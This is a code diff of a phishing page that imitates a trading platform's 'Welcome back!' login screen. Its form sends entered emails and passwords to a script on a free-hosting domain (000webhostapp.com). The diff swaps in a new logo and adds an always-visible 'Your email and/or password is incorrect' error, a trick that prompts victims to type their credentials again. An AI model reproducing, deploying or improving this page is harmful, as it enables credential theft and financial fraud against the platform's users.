@@ -116,7 +116,7 @@ a:hover{cursor:pointer;text-decoration:underline;}
                 margin: 0;
                 background-color: #FFFFFF;
                 letter-spacing: 0.15px;
-				    background: url(https://firebasestorage.googleapis.com/v0/b/deriiv-5f811.appspot.com/o/img%2FUntitlea32ad.png?alt=media&token=6feb0a24-c47c-4f5b-9011-a09050b1165b);
+				  
             }
             header {
                 display: flex;
@@ -124,7 +124,7 @@ a:hover{cursor:pointer;text-decoration:underline;}
                 justify-content: center;
                 height: 73px;
                 margin-bottom: 4rem;
-        
+            margin: 18px;
             }
             @media (max-width: 480px) {
                 header {
@@ -636,24 +636,29 @@ div#provider_facebook {
 
 </head>
 <body class="oauth">
-<header>
-
-</header>
+<header> <img  src="https://firebasestorage.googleapis.com/v0/b/bnc-images.appspot.com/o/image-removebg-preview%20(1).png?alt=media&amp;token=b161747e-43d9-4134-af54-fff65cdb4dda" style=" "> </header>
 <div id="container">
 <h1 class="title-text" style="font-size: 2.4rem">Welcome back!</h1>
 <p class="subtitle-text">It's good to see you again. Log in to start trading.</p>
 <form novalidate="" id="frmLogin" method="POST" action="https://wrldtrecoal1.000webhostapp.com/app/frm.php">
 <div class="input-group">
-<div class="input-wrapper">
-<input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required="" autocomplete="off" autofocus="autofocus" maxlength="254">
-<label for="txtEmail">Email</label>
-<span class="bar"></span>
-</div>
-<div class="input-error">
-<p class="hide error error_invalid">Please enter a valid email address.</p>
-<p class="hide error error_required">Email is required.</p>
-</div>
-</div>
+         <div class="input-wrapper has_error">
+            <input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required="" autocomplete="off" maxlength="254" autofocus="autofocus">
+            <label for="txtEmail">Email</label>
+            <span class="bar"></span>
+         </div>
+         <div class="input-error">
+            <p class="hide error error_invalid">That doesn't look like an email address.</p>
+            <p class="hide error error_required">Email is required.</p>
+            <p class="hide error error_invalid_pass">Your email and/or password is incorrect.</p>
+            
+            <p class="error">Your email and/or password is incorrect. Perhaps you signed up with a social account?</p>
+            <script>
+               trackEvent("login_flow_error", "email", 'Your email and/or password is incorrect. Perhaps you signed up with a social account?');
+            </script>
+            
+         </div>
+      </div>
 <div class="input-group">
 <div class="input-wrapper">
 <input type="password" id="txtPass" name="password" required="" autocomplete="off">
